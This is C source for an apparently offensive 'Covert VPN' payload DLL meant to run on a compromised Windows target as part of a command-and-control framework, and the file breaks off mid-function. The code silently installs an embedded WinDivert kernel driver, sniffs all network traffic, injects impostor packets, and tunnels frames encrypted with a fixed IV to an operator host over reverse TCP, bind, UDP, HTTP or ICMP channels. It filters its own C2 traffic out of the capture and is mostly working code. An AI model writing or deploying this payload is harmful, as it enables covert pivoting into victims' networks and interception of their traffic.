/*
 * covertvpn_v2.c — Covert VPN target-side payload (modernized)
 *
 * Replaces the original 677KB covertvpn.dll (WinPcap/NDIS 5, Win10+ broke it)
 * with a small self-contained DLL that selects a packet backend at runtime:
 *   - Npcap (L2): pcap API via wpcap.dll when the operator pre-installed it
 *   - WinDivert (L3): embedded signed WFP driver (92KB), SCM auto-install,
 *     driven through the raw 2.2.2 IOCTL protocol (no windivert.dll needed)
 *   - ndisprot (L2): self-built NDIS 6 protocol driver (separate deployment,
 *     needs Attestation signing) — probed via \\.\NdisProt
 *   - No wpcap.dll/packet.dll of our own; AES-CBC via Windows CNG (BCrypt)
 *   - Pre-compiled BPF filter patched in by the TS (no runtime compiler):
 *     kernel-side via pcap_setfilter on Npcap, user-mode interpreter on
 *     WinDivert (synthesized Ethernet header — TS uses Ethernet offsets)
 *
 * Wire compatibility: byte-for-byte with tap.EncryptedTap.java on the TS
 * ([u16 BE len][frame]['A' pad] -> AES-128-CBC, fixed IV) and the
 * endpoint.TCP/UDP socket framing.
 *
 * Config is patched positionally by VPNClient.exportClient() through the
 * trailing VPN_CONFIG_MARKER (offset table in the struct comment below).
 */

/* winsock2.h MUST come before windows.h (the classic include-order trap:
 * windows.h pulls in winsock.h v1 which conflicts with winsock2.h v2) */
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <stdio.h>
#include <string.h>

/* Embedded WFP kernel driver (WinDivert64.sys v2.2.2, 92KB, auto-generated)
 * WinDivert is SCM-installable (unlike Npcap NDIS 6 LWF) and provides
 * L3 packet capture/injection through the Windows Filtering Platform. */
#include "windivert_driver.h"

/* WinDivert: no user-mode DLL needed — we speak the driver's IOCTL
 * protocol directly (see the backend section below). */

/* Driver backend modes (matches GUI selection in CovertVPNSetup.java) */
#define DRV_AUTO      0  /* Auto: Npcap if installed → WinDivert fallback */
#define DRV_NPCAP     1  /* Manual: target has Npcap installed (L2 pcap API) */
#define DRV_NDISPROT  2  /* Manual: self-built signed driver (L2 direct I/O) */
#define DRV_WINDIVERT 3  /* Manual: always use WinDivert (L3 direct I/O) */

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")

/* =================================================================
 * CONFIG — patched at deployment by VPNClient.exportClient()
 * Markers must be unique enough to survive /O2 optimization.
 * ================================================================= */

#define VPN_MAX_FILTER_LEN   128
#define VPN_KEY_LEN          16   /* AES-128 */
#define VPN_FRAME_HDR        2   /* u16 length prefix */
#define VPN_BPF_MAX          32   /* max BPF instructions (up to 7 excluded IPs) */

/* Struct layout (packed byte offsets — VPNClient.exportClient patches by
 * position relative to the trailing VPN_CONFIG_MARKER; keep both sides in
 * sync when editing):
 *    0    channel        char
 *    1    driver_mode    char     DRV_*
 *    4    port           u16 LE
 *    8    remote_host[64]
 *    72   useragent[64]
 *    136  key[16]
 *    152  bpf_len        u16 LE   (instruction count)
 *    160  bpf_blob[256]           interleaved insns, 8B each:
 *                                 {u16 code, u8 jt, u8 jf, u32 k}
 *    416  adapter_hint[64]
 *    480  npcap_device[128]       \Device\NPF_{GUID} (advanced mode only)
 *    608  marker[32]
 */
#pragma pack(push, 1)
typedef struct _VPN_CONFIG {
    /* channel */
    char     channel;            /* 'b'=TCP bind, 'r'=TCP reverse, 'u'=UDP, 'h'=HTTP, 'i'=ICMP */
    char     driver_mode;        /* DRV_AUTO/NPCAP/NDISPROT/WINDIVERT (patched by TS) */
    char     _pad1[2];
    unsigned short port;         /* channel port */
    char     _pad2[2];

    /* addressing */
    char     remote_host[64];    /* TS/reverse host (reverse/http/icmp channels) */
    char     useragent[64];      /* HTTP channel User-Agent */

    /* crypto: AES-128-CBC key, fixed tap IV "abcdefghijklmnop" (matches
     * tap.EncryptedTap.java byte-for-byte) */
    unsigned char key[VPN_KEY_LEN];

    /* pre-compiled BPF filter (TS generates, target just passes to kernel) */
    unsigned short bpf_len;      /* number of BPF instructions */
    char     _pad3[6];
    unsigned char bpf_blob[VPN_BPF_MAX * 8]; /* interleaved insns */

    /* adapter selection hint (optional, empty = first non-loopback) */
    char     adapter_hint[64];

    /* Npcap device path (filled at runtime or patched by TS) */
    char     npcap_device[128]; /* \Device\NPF_{GUID} */

    /* marker for exportClient to find & patch this struct */
    char     marker[32];         /* replaced at build time */
} VPN_CONFIG;
#pragma pack(pop)

/* The actual config instance — discoverable by the TS patcher */
VPN_CONFIG g_config = {
    'b', DRV_AUTO, {0,0}, 0, {0,0},
    "VPN_REMOTEHOST_MARKER_______________________",
    "VPN_USERAGENT_MARKER_________________________",
    { 0 }, /* key */
    0, {0,0,0,0,0,0},
    { 0 }, /* bpf_blob */
    "VPN_ADAPTER_HINT_MARKER_____________________",
    "VPN_NPCAP_DEVICE_MARKER______________________________________________________________________",
    "VPN_CONFIG_MARKER_0000000000"
};

/* =================================================================
 * BPF IOCTL constants (same as NPF driver interface)
 * ================================================================= */

#define BIOCSETF        0x80104  /* set BPF filter */
#define BIOCSENDPACKETS 0x80114  /* send packets */
#define BIOCGSTATS      0x80204  /* get stats */

struct bpf_insn_kernel {
    unsigned short code;
    unsigned char  jt, jf;
    unsigned int   k;
};

struct bpf_program_kernel {
    unsigned int bf_len;
    struct bpf_insn_kernel *bf_insns;
};

/* =================================================================
 * DEVICE I/O LAYER — Unified: Npcap (L2) + WinDivert (L3)
 *
 * The VPN logic just moves packets between the local network stack and
 * the C2 channel. Two backends:
 *   - Npcap pcap API: L2 Ethernet frames (when Npcap is installed)
 *   - WinDivert: L3 IP packets (always works, SCM-installable)
 * ================================================================= */

/* Active backend tracking */
static int g_active_backend = -1;  /* 0=Npcap, 1=WinDivert */

/* BPF runtime — defined in the filter section below, used by read paths */
static unsigned int bpf_run(const unsigned char *pkt, unsigned int buflen);
static unsigned int g_bpf_prog_len;

/* ---- Npcap pcap API backend (L2 Ethernet frames) ---- */
/* We dynamically load wpcap.dll from system32 (Npcap WinPcap-compat mode) */
static HMODULE g_wpcap = NULL;
static void *g_pcap_handle = NULL;  /* pcap_t* from pcap_open_live */

/* Function pointers resolved via GetProcAddress */
typedef void *(*pcap_open_live_t)(const char *, int, int, int, char *);
typedef int (*pcap_next_ex_t)(void *, void **, void **);
typedef int (*pcap_sendpacket_t)(void *, const unsigned char *, int);
typedef void (*pcap_close_t)(void *);
typedef void (*pcap_freealldevs_t)(void *);
typedef int (*pcap_findalldevs_t)(void **, char *);
typedef int (*pcap_setfilter_t)(void *, void *);

static pcap_open_live_t    p_pcap_open_live;
static pcap_next_ex_t      p_pcap_next_ex;
static pcap_sendpacket_t   p_pcap_sendpacket;
static pcap_close_t        p_pcap_close;
static pcap_setfilter_t    p_pcap_setfilter;

/* Light probe: can we load wpcap.dll with the exports we need?
 * (Touches no device — used by vpn_ensure_driver for DRV_AUTO/DRV_NPCAP.) */
static int
vpn_npcap_available(void)
{
    if (!g_wpcap) {
        HMODULE m = LoadLibraryA("wpcap.dll");
        if (!m) return 0;

        p_pcap_open_live  = (pcap_open_live_t)GetProcAddress(m, "pcap_open_live");
        p_pcap_next_ex    = (pcap_next_ex_t)GetProcAddress(m, "pcap_next_ex");
        p_pcap_sendpacket = (pcap_sendpacket_t)GetProcAddress(m, "pcap_sendpacket");
        p_pcap_close      = (pcap_close_t)GetProcAddress(m, "pcap_close");
        p_pcap_setfilter  = (pcap_setfilter_t)GetProcAddress(m, "pcap_setfilter");

        if (!p_pcap_open_live || !p_pcap_next_ex || !p_pcap_sendpacket || !p_pcap_close) {
            FreeLibrary(m);
            return 0;
        }
        g_wpcap = m;
    }
    return 1;
}

/* Npcap device discovery: patched path from config, else first non-loopback */
static int
vpn_npcap_open(void)
{
    char errbuf[256] = {0};
    char device[160];
    const char *dev = NULL;

    if (!vpn_npcap_available()) return -1;

    /* Option A: TS patched a specific device path into config.
     * Un-patched config still holds the "VPN_NPCAP_DEVICE_MARKER..." string
     * (first byte 'V') — treat that as empty. */
    if (g_config.npcap_device[0] != 0 &&
        g_config.npcap_device[0] != 'V' &&
        strncmp(g_config.npcap_device, "VPN_", 4) != 0) {
        dev = g_config.npcap_device;
    }

    /* Option B: enumerate devices and pick first non-loopback */
    if (!dev) {
        pcap_findalldevs_t p_findalldevs = (pcap_findalldevs_t)GetProcAddress(g_wpcap, "pcap_findalldevs");
        pcap_freealldevs_t p_freealldevs = (pcap_freealldevs_t)GetProcAddress(g_wpcap, "pcap_freealldevs");
        if (p_findalldevs) {
            void *devs = NULL;
            if (p_findalldevs(&devs, errbuf) == 0 && devs) {
                /* Walk linked list: pcap_if is {next*, name*, desc*, addr*, flags}
                 * — name sits at offset 8 on both x86 and x64. */
                char *p = (char *)devs;
                for (int i = 0; i < 10 && p; i++) {
                    char **name_ptr = (char **)(p + 8);
                    if (name_ptr && *name_ptr) {
                        /* Skip Npcap's software loopback adapter */
                        if (strstr(*name_ptr, "Loopback") == NULL &&
                            strstr(*name_ptr, "loopback") == NULL) {
                            lstrcpynA(device, *name_ptr, sizeof(device));
                            dev = device;
                            break;
                        }
                    }
                    p = *(char **)p;  /* next pointer at offset 0 */
                }
                if (p_freealldevs) p_freealldevs(devs);  /* device was copied */
            }
        }
    }

    if (!dev) return -1;

    /* Open the device via pcap API: promiscuous, 1s read timeout */
    g_pcap_handle = p_pcap_open_live(dev, 65535, 1, 1000, errbuf);
    if (!g_pcap_handle) return -1;

    g_active_backend = 0;  /* Npcap */
    return 0;
}

/* ---- WinDivert 2.2.2 backend (L3 IP packets) ----
 *
 * Talks the real driver protocol (verified against the v2.2.2 sources):
 *   1. CreateFile("\\\\..\WinDivert", GENERIC_READ|GENERIC_WRITE)
 *   2. IOCTL INITIALIZE  (16B WINDIVERT_IOCTL in; 64B version out; magic check)
 *   3. IOCTL STARTUP     (16B ioctl in; compiled filter array as direct buf)
 *   4. IOCTL SET_PARAM   (queue time = 100ms so the C2 channel stays serviced)
 * RECV/SEND carry the packet in the DeviceIoControl output/direct buffer and
 * a WINDIVERT_ADDRESS (80B) via the ioctl union.
 *
 * Handle flags = SNIFF: packets are observed, not blocked (libpcap-like
 * capture semantics); SEND injects impostor packets. Impostor injections
 * get their checksums recalculated (flag bits 0) and TTL decremented by
 * the driver — both fine for VPN bridging.
 */

/* CTL_CODE(FILE_DEVICE_NETWORK=0x12, fn, method, access) */
#define WD_CTL(fn, method, access) \
    (((0x12u) << 16) | ((access) << 14) | ((fn) << 2) | (method))
#define IOCTL_WD_INITIALIZE  WD_CTL(0x921, 2, 3)  /* OUT_DIRECT, RW   */
#define IOCTL_WD_STARTUP     WD_CTL(0x922, 1, 3)  /* IN_DIRECT,  RW   */
#define IOCTL_WD_RECV        WD_CTL(0x923, 2, 1)  /* OUT_DIRECT, R    */
#define IOCTL_WD_SEND        WD_CTL(0x924, 1, 3)  /* IN_DIRECT,  RW   */
#define IOCTL_WD_SET_PARAM   WD_CTL(0x925, 1, 3)  /* IN_DIRECT,  RW   */

#define WD_MAGIC_DLL  0x4C4C447669645724ULL
#define WD_MAGIC_SYS  0x5359537669645723ULL
#define WD_FLAG_SNIFF 0x0000000000000001ULL
#define WD_PRIORITY_MAX 30000
#define WD_LAYER_NETWORK  0
#define WD_PARAM_QUEUE_TIME 1

/* WINDIVERT_IOCTL union (16 bytes, packed) */
#pragma pack(push, 1)
typedef union _WD_IOCTL {
    unsigned char bytes[16];
    struct { unsigned int layer; unsigned int priority; unsigned long long flags; } initialize;
    struct { unsigned long long flags; } startup;
    struct { unsigned long long addr; unsigned long long addr_len_ptr; } recv;
    struct { unsigned long long addr; unsigned long long addr_len; } send;
    struct { unsigned long long val; unsigned int param; } set_param;
} WD_IOCTL;

/* WINDIVERT_VERSION (64 bytes, packed) */
typedef struct _WD_VERSION {
    unsigned long long magic;
    unsigned int major, minor, bits;
    unsigned int reserved32[3];
    unsigned long long reserved64[4];
} WD_VERSION;

/* WINDIVERT_FILTER (24 bytes, packed): bitfield words + arg[4] */
typedef struct _WD_FILTER {
    unsigned int word0;            /* field:11 | test:5 | success:16 */
    unsigned int word1;            /* failure:16 | neg:1 | reserved:15 */
    unsigned int arg[4];
} WD_FILTER;

/* WINDIVERT_ADDRESS (80 bytes, packed) */
typedef struct _WD_ADDRESS {
    long long timestamp;
    unsigned int flags1;           /* Layer:8 Event:8 Sniffed Outbound
                                      Loopback Impostor IPv6 IPChecksum
                                      TCPChecksum UDPChecksum Reserved1:8 */
    unsigned int reserved2;
    unsigned char data[64];        /* Network: {u32 IfIdx; u32 SubIfIdx} at 0 */
} WD_ADDRESS;
#pragma pack(pop)

/* Filter label magic values */
#define WD_FACCEPT 0x7FFE
#define WD_FREJECT 0x7FFF

/* WINDIVERT_FILTER_FLAG_*: these are NOT just hints — they select which
 * WFP callouts the driver installs (zero flags = zero callouts = the
 * handle never sees a single packet). Capture-all wants all four. */
#define WD_FF_INBOUND   0x0000000000000010ULL
#define WD_FF_OUTBOUND  0x0000000000000020ULL
#define WD_FF_IP        0x0000000000000040ULL
#define WD_FF_IPV6      0x0000000000000080ULL
#define WD_FF_CAPTURE_ALL (WD_FF_INBOUND | WD_FF_OUTBOUND | WD_FF_IP | WD_FF_IPV6)

/* Address flag1 bits (bit N = 1<<N in flags1) */
#define WD_ADDR_OUTBOUND  (1u << 17)
#define WD_ADDR_IMPOSTOR  (1u << 19)

static HANDLE g_wd_device = INVALID_HANDLE_VALUE;
static WD_ADDRESS g_wd_recv_addr;   /* last address seen on RECV */
static WD_ADDRESS g_wd_send_addr;   /* template used on SEND */

/* Device probe: does the \\.\WinDivert device exist (driver loaded)? */
static int
vpn_windivert_device_ready(void)
{
    HANDLE h = CreateFileA("\\\\.\\WinDivert", GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    CloseHandle(h);
    return 1;
}

static HANDLE
vpn_windivert_open(void)
{
    WD_IOCTL io;
    WD_VERSION ver;
    /* "not loopback && true": insn0 jumps to insn1 when loopback==0,
     * rejects otherwise. insn1 accepts everything. */
    WD_FILTER filt[2];

    filt[0].word0 = 58 /*LOOPBACK*/ | (0 /*EQ*/ << 11) | (1 /*->insn1*/ << 16);
    filt[0].word1 = WD_FREJECT;
    memset(&filt[0].arg, 0, sizeof(filt[0].arg));
    filt[1].word0 = (WD_FACCEPT << 16);
    filt[1].word1 = WD_FACCEPT;
    memset(&filt[1].arg, 0, sizeof(filt[1].arg));

    HANDLE h = CreateFileA("\\\\.\\WinDivert", GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;

    /* 1. INITIALIZE: layer NETWORK, priority 0 (+30000 bias), SNIFF */
    memset(&io, 0, sizeof(io));
    io.initialize.layer    = WD_LAYER_NETWORK;
    io.initialize.priority = WD_PRIORITY_MAX;      /* 0 + 30000 */
    io.initialize.flags    = WD_FLAG_SNIFF;
    memset(&ver, 0, sizeof(ver));
    ver.magic = WD_MAGIC_DLL;
    ver.major = 2;
    ver.minor = 2;
    ver.bits  = 64;
    if (!DeviceIoControl(h, IOCTL_WD_INITIALIZE, &io, sizeof(io),
                         &ver, sizeof(ver), NULL, NULL) ||
        ver.magic != WD_MAGIC_SYS || ver.major < 2) {
        CloseHandle(h);
        return INVALID_HANDLE_VALUE;
    }

    /* 2. STARTUP: filter hints select the WFP callouts to install
     * (all four = capture inbound+outbound, v4+v6); 2-instruction
     * "!loopback" filter */
    memset(&io, 0, sizeof(io));
    io.startup.flags = WD_FF_CAPTURE_ALL;
    if (!DeviceIoControl(h, IOCTL_WD_STARTUP, &io, sizeof(io),
                         filt, sizeof(filt), NULL, NULL)) {
        CloseHandle(h);
        return INVALID_HANDLE_VALUE;
    }

    /* 3. Queue time 100ms (best effort) so RECV can't block the loop */
    memset(&io, 0, sizeof(io));
    io.set_param.param = WD_PARAM_QUEUE_TIME;
    io.set_param.val   = 100;
    DeviceIoControl(h, IOCTL_WD_SET_PARAM, &io, sizeof(io), NULL, 0, NULL, NULL);

    memset(&g_wd_recv_addr, 0, sizeof(g_wd_recv_addr));
    memset(&g_wd_send_addr, 0, sizeof(g_wd_send_addr));
    g_wd_send_addr.flags1 = WD_ADDR_OUTBOUND | WD_ADDR_IMPOSTOR;

    g_wd_device = h;
    g_active_backend = 1;  /* WinDivert */
    return h;
}

/* ---- Unified dispatch: open the backend selected by driver_mode ----
 * Returns a non-INVALID pseudo-HANDLE on success (the read/write/close
 * dispatch keys off g_active_backend, not off this value). */
static HANDLE
vpn_open_packet_device(void)
{
    switch (g_config.driver_mode) {
    case DRV_NPCAP:
        /* Manual: operator confirmed Npcap is installed */
        if (vpn_npcap_open() == 0) return (HANDLE)(INT_PTR)1;
        return INVALID_HANDLE_VALUE;

    case DRV_WINDIVERT:
        /* Manual: force WinDivert */
        return vpn_windivert_open();

    case DRV_AUTO:
    default:
        /* Auto: prefer Npcap (L2, richer), fall back to WinDivert (L3) */
        if (vpn_npcap_open() == 0) return (HANDLE)(INT_PTR)1;
        return vpn_windivert_open();
    }
}

/* ---- Unified frame read: dispatch to active backend ---- */
static int
vpn_read_frame(HANDLE fd, unsigned char *buf, int len)
{
    if (g_active_backend == 0 && g_pcap_handle) {
        /* Npcap pcap API: read L2 Ethernet frame (kernel BPF already
         * dropped excluded traffic if a filter was set) */
        void *hdr = NULL, *pkt = NULL;
        int ret = p_pcap_next_ex(g_pcap_handle, &hdr, &pkt);
        if (ret != 1 || !pkt) return -1;
        /* pcap_pkthdr: {ts(8B); caplen(4B); len(4B)} → caplen at offset 8 */
        int caplen = *(int *)((char *)hdr + 8);
        if (caplen > len) caplen = len;
        memcpy(buf, pkt, caplen);
        return caplen;
    }

    if (g_active_backend == 1 && g_wd_device != INVALID_HANDLE_VALUE) {
        /* WinDivert: read L3 IP packet. The channel (TS-side Linux TAP)
         * carries Ethernet frames, so we synthesize a 14-byte header:
         * dst = broadcast, src = zeros, ethertype from the IP version.
         * The same header feeds the user-mode BPF, which uses Ethernet
         * offsets (EtherType at 12, IP src at 26, IP dst at 30). */
        unsigned char pkt[14 + 65536];
        WD_IOCTL io;
        DWORD got = 0;

        if (len < 15) return -1;

        memset(&io, 0, sizeof(io));
        io.recv.addr        = (unsigned long long)(ULONG_PTR)&g_wd_recv_addr;
        io.recv.addr_len_ptr = 0;

        if (!DeviceIoControl(g_wd_device, IOCTL_WD_RECV, &io, sizeof(io),
                             pkt + 14, len - 14, &got, NULL) || got == 0)
            return -1;  /* timeout (100ms queue) or error == "no packet" */

        /* synthesize the Ethernet header */
        memset(pkt, 0, 14);
        memset(pkt, 0xFF, 6);                       /* dst = broadcast */
        pkt[12] = 0x08;
        pkt[13] = (pkt[14] >> 4) == 6 ? 0xDD : 0x00; /* IPv6 : IPv4 */

        if (g_bpf_prog_len > 0) {
            if (bpf_run(pkt, 14 + (unsigned int)got) == 0)
                return -1;  /* excluded (e.g. our own C2 traffic) — drop */
        }

        memcpy(buf, pkt, 14 + got);
        return (int)(14 + got);
    }

    return -1;
}

/* ---- Unified frame write: dispatch to active backend ---- */
static int
vpn_write_frame(HANDLE fd, const unsigned char *buf, int len)
{
    if (g_active_backend == 0 && g_pcap_handle) {
        /* Npcap pcap API: inject L2 Ethernet frame */
        return p_pcap_sendpacket(g_pcap_handle, buf, len) == 0 ? len : -1;
    }

    if (g_active_backend == 1 && g_wd_device != INVALID_HANDLE_VALUE) {
        /* WinDivert: the channel delivered an Ethernet frame; strip the
         * 14-byte header and inject the bare IP packet as an outbound
         * impostor. Outbound injection needs no IfIdx; the driver
         * recalculates checksums (flag bits clear). Non-IP ethertypes
         * (ARP etc.) cannot be injected at L3 — drop them. */
        WD_IOCTL io;
        unsigned int etype;
        DWORD sent = 0;

        if (len < 15) return -1;
        etype = ((unsigned int)buf[12] << 8) | buf[13];
        if (etype != 0x0800 && etype != 0x86DD) return len;

        memset(&io, 0, sizeof(io));
        io.send.addr     = (unsigned long long)(ULONG_PTR)&g_wd_send_addr;
        io.send.addr_len = sizeof(WD_ADDRESS);

        if (!DeviceIoControl(g_wd_device, IOCTL_WD_SEND, &io, sizeof(io),
                             (void *)(buf + 14), len - 14, &sent, NULL))
            return -1;
        return (int)sent;
    }

    return -1;
}

/* ---- Unified close ---- */
static void
vpn_close_device(HANDLE fd)
{
    if (g_pcap_handle && p_pcap_close) {
        p_pcap_close(g_pcap_handle);
        g_pcap_handle = NULL;
    }
    if (g_wd_device != INVALID_HANDLE_VALUE) {
        CloseHandle(g_wd_device);
        g_wd_device = INVALID_HANDLE_VALUE;
    }
    if (g_wpcap) {
        /* Don't FreeLibrary — wpcap.dll may be in use by other code */
        g_wpcap = NULL;
    }
    g_active_backend = -1;
}

/* =================================================================
 * BPF FILTER — pre-compiled by the TS (compileBpfFilter in
 * VPNClient.java), stored interleaved in g_config.bpf_blob:
 * {u16 code, u8 jt, u8 jf, u32 k} per instruction.
 *
 * Npcap backend: pushed to the kernel with pcap_setfilter.
 * WinDivert backend: WinDivert has no BPF hook, so the program runs
 * in user mode against a synthetic 14-byte Ethernet header prepended
 * to the L3 packet (the TS program uses Ethernet offsets: EtherType
 * at 12, IP src at 26, IP dst at 30).
 * ================================================================= */

/* Reconstructed program for pcap_setfilter (needs a contiguous array) */
static struct bpf_insn_kernel g_bpf_insns[VPN_BPF_MAX];
/* g_bpf_prog_len: tentatively declared above the device layer */

/* User-mode BPF interpreter — classic Berkeley filter semantics.
 * Only the opcodes compileBpfFilter emits are implemented; any load
 * past the buffer or unknown opcode rejects the packet. */
static unsigned int
bpf_run(const unsigned char *pkt, unsigned int buflen)
{
    const struct bpf_insn_kernel *prog = g_bpf_insns;
    unsigned int A = 0, pc;

    for (pc = 0; pc < g_bpf_prog_len; pc++) {
        const struct bpf_insn_kernel *insn = &prog[pc];
        unsigned int k = insn->k;

        switch (insn->code) {
        case 0x00:  /* BPF_LD | BPF_W | BPF_IMM */
            A = k;
            break;
        case 0x20:  /* BPF_LD | BPF_W | BPF_ABS */
            if (k + 4 > buflen) return 0;
            A = ((unsigned int)pkt[k] << 24) | ((unsigned int)pkt[k+1] << 16)
              | ((unsigned int)pkt[k+2] << 8)  |  (unsigned int)pkt[k+3];
            break;
        case 0x28:  /* BPF_LD | BPF_H | BPF_ABS */
            if (k + 2 > buflen) return 0;
            A = ((unsigned int)pkt[k] << 8) | (unsigned int)pkt[k+1];
            break;
        case 0x30:  /* BPF_LD | BPF_B | BPF_ABS */
            if (k + 1 > buflen) return 0;
            A = pkt[k];
            break;
        case 0x15:  /* BPF_JMP | BPF_JEQ | BPF_K */
            pc = (A == k) ? pc + insn->jt : pc + insn->jf;
            break;
        case 0x35:  /* BPF_JMP | BPF_JGE | BPF_K */
            pc = (A >= k) ? pc + insn->jt : pc + insn->jf;
            break;
        case 0x25:  /* BPF_JMP | BPF_JGT | BPF_K */
            pc = (A > k) ? pc + insn->jt : pc + insn->jf;
            break;
        case 0x06:  /* BPF_RET | BPF_K */
            return k;
        case 0x16:  /* BPF_RET | BPF_A */
            return A;
        default:
            return 0;  /* unknown opcode -> reject */
        }
    }
    return 0;  /* fell off the end -> reject */
}

/* Unpack the interleaved blob from config into g_bpf_insns.
 * bpf_len == 0 means "no filter" (pass everything). */
static void
bpf_load_from_config(void)
{
    unsigned int n = g_config.bpf_len;
    unsigned int i;

    if (n > VPN_BPF_MAX) n = VPN_BPF_MAX;
    for (i = 0; i < n; i++) {
        const unsigned char *p = &g_config.bpf_blob[i * 8];
        g_bpf_insns[i].code = (unsigned short)(p[0] | ((unsigned short)p[1] << 8));
        g_bpf_insns[i].jt   = p[2];
        g_bpf_insns[i].jf   = p[3];
        g_bpf_insns[i].k    = (unsigned int)p[4] | ((unsigned int)p[5] << 8)
                            | ((unsigned int)p[6] << 16) | ((unsigned int)p[7] << 24);
    }
    g_bpf_prog_len = n;
}

/* Apply the pre-compiled BPF program to the active backend.
 * Returns 0 if a filter is active (or none needed), -1 on failure. */
static int
vpn_set_filter(HANDLE fd)
{
    if (g_bpf_prog_len == 0) return 0;  /* no filter — nothing to do */

    if (g_active_backend == 0 && g_pcap_handle && p_pcap_setfilter) {
        /* Npcap: push the program into the kernel */
        struct bpf_program_kernel prog;
        prog.bf_len   = g_bpf_prog_len;
        prog.bf_insns = g_bpf_insns;
        return p_pcap_setfilter(g_pcap_handle, &prog) == 0 ? 0 : -1;
    }

    /* WinDivert: no kernel hook — vpn_read_frame runs bpf_run() in user
     * mode, so just report success here. */
    return 0;
}

/* =================================================================
 * AES-CBC LAYER — Windows CNG (BCrypt), no crypto library
 * Matches tap.EncryptedTap.java on the TS side.
 * ================================================================= */

static BCRYPT_ALG_HANDLE g_aes_alg = NULL;
static BCRYPT_KEY_HANDLE g_aes_key = NULL;

static int
vpn_aes_init(void)
{
    NTSTATUS st;
    st = BCryptOpenAlgorithmProvider(&g_aes_alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(st)) return -1;
    st = BCryptSetProperty(g_aes_alg, BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                           sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(st)) return -1;
    st = BCryptGenerateSymmetricKey(g_aes_alg, &g_aes_key,
                                    NULL, 0,
                                    (PUCHAR)g_config.key, VPN_KEY_LEN, 0);
    return BCRYPT_SUCCESS(st) ? 0 : -1;
}

/* =================================================================
 * FRAME CRYPTO — must match tap.EncryptedTap.java byte-for-byte:
 *   plaintext = [u16 BE frame_len][frame]['A'(0x41) pad to %16]
 *   blob      = AES-128-CBC(key = 16B secret, fixed IV
 *                            "abcdefghijklmnop", NoPadding)
 * Channel framing:
 *   TCP: [u16 BE blob_len][blob]
 *   UDP: one datagram per blob
 * Kill: the TS sends an UNENCRYPTED 4-byte blob {00 02 00 00}.
 * ================================================================= */

static const unsigned char g_tap_iv[16] = "abcdefghijklmnop";

static int
vpn_aes_encrypt(unsigned char *blob, const unsigned char *frame, int n)
{
    /* n == -1 signals the kill frame (unencrypted {00 02 00 00}) */
    if (n == -1) {
        memcpy(blob, "\x00\x02\x00\x00", 4);
        return 4;
    }

    int plen = 2 + n;
    int pad = 16 - (plen % 16);
    if (pad == 16) pad = 0;

    blob[0] = (unsigned char)((n >> 8) & 0xFF);
    blob[1] = (unsigned char)(n & 0xFF);
    memcpy(blob + 2, frame, n);
    memset(blob + plen, 'A', pad);

    unsigned char iv[16];
    memcpy(iv, g_tap_iv, 16);
    ULONG out_len = 0;
    NTSTATUS st = BCryptEncrypt(g_aes_key, blob, plen + pad, NULL,
                                iv, 16, blob, plen + pad, &out_len, 0);
    return BCRYPT_SUCCESS(st) ? (int)out_len : -1;
}

/* Decrypt a blob in place; returns the frame length, frame at blob[0].
 * -1 = bad blob, -2 = kill frame. */
static int
vpn_aes_decrypt(unsigned char *blob, int len)
{
    if (len == 4 && blob[0] == 0 && blob[1] == 2 && blob[2] == 0 && blob[3] == 0)
        return -2;  /* TS kill frame */

    if (len % 16 != 0 || len < 16) return -1;

    unsigned char iv[16];
    memcpy(iv, g_tap_iv, 16);
    ULONG out_len = 0;
    NTSTATUS st = BCryptDecrypt(g_aes_key, blob, len, NULL,
                                iv, 16, blob, len, &out_len, 0);
    if (!BCRYPT_SUCCESS(st)) return -1;

    int n = ((int)blob[0] << 8) | blob[1];
    if (n < 0 || n > len - 2) return -1;
    memmove(blob, blob + 2, n);
    return n;
}

/* =================================================================
 * CHANNEL LAYERS — talk to the TS tap endpoint (endpoint/TCP.java,
 * endpoint/UDP.java on the TS side):
 *   'b' TCP (Bind):   LISTEN on 127.0.0.1:port; the beacon's portfwd
 *                     bridge (dialed by the TS endpoint) connects to us
 *   'r' TCP (Reverse):connect to remote_host:port directly
 *   'u' UDP:          datagrams to remote_host:port
 * Wire: TCP [u16 BE blob_len][blob]; UDP one blob per datagram.
 * ================================================================= */

static SOCKET g_channel_fd = INVALID_SOCKET; /* TCP/UDP socket */
static struct sockaddr_in g_udp_peer;        /* TS side for UDP sendto */
static HINTERNET g_http_conn = NULL;   /* HTTP session */
static HANDLE g_icmp_handle = INVALID_HANDLE_VALUE; /* ICMP */

/* --- TCP connect (used by both Bind-via-portfwd and Reverse) --- */
static int
channel_tcp_connect(const char *host, unsigned short port)
{
    struct sockaddr_in addr;
    struct hostent *he;
    unsigned long ip;

    g_channel_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (g_channel_fd == INVALID_SOCKET) return -1;

    ip = inet_addr(host);
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (ip != INADDR_NONE) {
        addr.sin_addr.s_addr = ip;
    } else {
        he = gethostbyname(host);
        if (!he) { closesocket(g_channel_fd); g_channel_fd = INVALID_SOCKET; return -1; }
        addr.sin_addr = *((struct in_addr *)he->h_addr_list[0]);
    }

    if (connect(g_channel_fd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(g_channel_fd);
        g_channel_fd = INVALID_SOCKET;
        return -1;
    }
    return 0;
}

/* --- TCP (Bind): LISTEN on 127.0.0.1:port. The TS endpoint
 * (endpoint.TCP, listen=false) dials its own local PortForward, which is
 * bridged through the beacon — the beacon's pivot connect lands on OUR
 * listener here on the target. It retries every ~10s, so listen forever
 * until the bridge dials in. --- */
static int
channel_tcp_bind_init(unsigned short port)
{
    struct sockaddr_in addr;
    SOCKET srv;
    int one = 1;

    srv = socket(AF_INET, SOCK_STREAM, 0);
